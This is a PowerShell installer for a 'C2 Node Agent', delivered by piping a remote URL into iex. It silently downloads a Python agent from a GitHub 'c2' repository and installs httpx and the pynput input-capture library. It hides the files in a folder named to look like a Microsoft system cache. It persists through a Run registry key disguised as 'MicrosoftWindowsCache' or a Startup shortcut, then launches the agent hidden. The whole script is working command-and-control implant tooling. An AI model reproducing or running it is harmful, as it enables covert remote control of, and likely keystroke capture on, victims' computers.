<#
.SYNOPSIS
    C2 Node Agent - Quiet user-level installer (no elevation)

.DESCRIPTION
    Prints "..." while running.
    "[]" = success. "[1]".."[5]" = failure stage.
    No param() block — required for reliable irm|iex.

.EXAMPLE
    irm c.xrorx.com|iex
    iex (iwr -useb c.xrorx.com).Content
#>

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$WarningPreference = "SilentlyContinue"
$InformationPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"

$InstallPath = "$env:LOCALAPPDATA\Microsoft\Windows\SystemCache"

function Refresh-Path {
    $machine = [System.Environment]::GetEnvironmentVariable("Path", "Machine")
    $user = [System.Environment]::GetEnvironmentVariable("Path", "User")
    $env:Path = @($machine, $user) -join ";"
}

function Find-Python {
    Refresh-Path
    foreach ($cmd in @("python", "python3", "py")) {
        $c = Get-Command $cmd -ErrorAction SilentlyContinue
        if (-not $c) { continue }
        try {
            if ($cmd -eq "py") {
                $out = & py -3 -c "import sys; print(sys.executable)" 2>$null
            } else {
                $out = & $c.Source -c "import sys; print(sys.executable)" 2>$null
            }
            if ($out -and (Test-Path $out.Trim())) {
                return $out.Trim()
            }
        } catch {}
    }
    $candidates = @(
        "$env:LOCALAPPDATA\Programs\Python\Python312\python.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe",
        "$env:ProgramFiles\Python312\python.exe",
        "$env:ProgramFiles\Python311\python.exe"
    )
    foreach ($p in $candidates) {
        if (Test-Path $p) { return $p }
    }
    return $null
}

Write-Host "..."

try {
    $procs = Get-WmiObject Win32_Process -ErrorAction SilentlyContinue | Where-Object {
        ($_.Name -eq "python.exe" -or $_.Name -eq "pythonw.exe") -and
        ($_.CommandLine -like "*agent.py*")
    }
    foreach ($p in @($procs)) {
        Stop-Process -Id $p.ProcessId -Force -ErrorAction SilentlyContinue
    }

    Get-ScheduledTask -ErrorAction SilentlyContinue |
        Where-Object { $_.TaskName -like "*C2Agent*" } |
        Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue

    $pythonPath = Find-Python

    if (-not $pythonPath) {
        try {
            winget install Python.Python.3.12 `
                --accept-source-agreements `
                --accept-package-agreements `
                --silent `
                --disable-interactivity 2>&1 | Out-Null
            Start-Sleep -Seconds 3
            $pythonPath = Find-Python
        } catch {}
    }

    # [1] Python not found / not usable
    if (-not $pythonPath) {
        Write-Host "[1]"
        return
    }

    $pythonDir = Split-Path $pythonPath
    $pythonwPath = Join-Path $pythonDir "pythonw.exe"
    if (-not (Test-Path $pythonwPath)) { $pythonwPath = $pythonPath }

    if (-not (Test-Path $InstallPath)) {
        New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
    }

    $agentPyPath = Join-Path $InstallPath "agent.py"
    $downloadUrl = "https://raw.githubusercontent.com/zen-zecode/c2/main/node/agent.py"
    try {
        Invoke-WebRequest -Uri $downloadUrl -OutFile $agentPyPath -UseBasicParsing
    } catch {
        Write-Host "[2]"
        return
    }
    # [2] agent.py download failed
    if (-not (Test-Path $agentPyPath) -or (Get-Item $agentPyPath).Length -lt 1000) {
        Write-Host "[2]"
        return
    }

    $venvPath = Join-Path $InstallPath "venv"
    $pyvenvCfg = Join-Path $venvPath "pyvenv.cfg"
    if (-not (Test-Path $pyvenvCfg)) {
        if (Test-Path $venvPath) {
            Remove-Item $venvPath -Recurse -Force -ErrorAction SilentlyContinue
        }
        & $pythonPath -m venv $venvPath 2>&1 | Out-Null
    }
    # [3] venv creation failed
    if (-not (Test-Path $pyvenvCfg)) {
        Write-Host "[3]"
        return
    }

    $venvPython = Join-Path $venvPath "Scripts\python.exe"
    $venvPythonw = Join-Path $venvPath "Scripts\pythonw.exe"
    if (-not (Test-Path $venvPythonw)) { $venvPythonw = $venvPython }
    if (-not (Test-Path $venvPython)) {
        Write-Host "[3]"
        return
    }

    $reqFile = Join-Path $InstallPath "requirements.txt"
    @"
httpx>=0.27.0
pynput>=1.7.0
"@ | Set-Content -Path $reqFile -Encoding UTF8

    & $venvPython -m pip install --upgrade pip --quiet --disable-pip-version-check 2>&1 | Out-Null
    & $venvPython -m pip install -r $reqFile --quiet --disable-pip-version-check 2>&1 | Out-Null

    # Verify httpx import
    & $venvPython -c "import httpx" 2>&1 | Out-Null
    if ($LASTEXITCODE -ne 0) {
        Write-Host "[4]"
        return
    }

    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $name = "MicrosoftWindowsCache"
    $cmd = "cmd /c cd /d `"$venvPath`" && `"$venvPythonw`" `"$agentPyPath`""

    try {
        Set-ItemProperty -Path $regPath -Name $name -Value $cmd -ErrorAction Stop
    } catch {
        $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\C2Update.lnk"
        $wsh = New-Object -ComObject WScript.Shell
        $sh = $wsh.CreateShortcut($shortcutPath)
        $sh.TargetPath = "cmd.exe"
        $sh.Arguments = "/c cd /d `"$venvPath`" && `"$venvPythonw`" `"$agentPyPath`""
        $sh.WindowStyle = 7
        $sh.Save()
    }

    $outLog = Join-Path $InstallPath "agent.out.log"
    $errLog = Join-Path $InstallPath "agent.err.log"
    $proc = Start-Process -FilePath $venvPython -ArgumentList "`"$agentPyPath`"" `
        -WorkingDirectory $venvPath -WindowStyle Hidden -PassThru `
        -RedirectStandardOutput $outLog -RedirectStandardError $errLog
    Start-Sleep -Seconds 4
    # [5] agent process exited immediately
    if (-not $proc -or $proc.HasExited) {
        Write-Host "[5]"
        return
    }
} catch {
    Write-Host "[0]"
    return
}

Write-Host "[]"
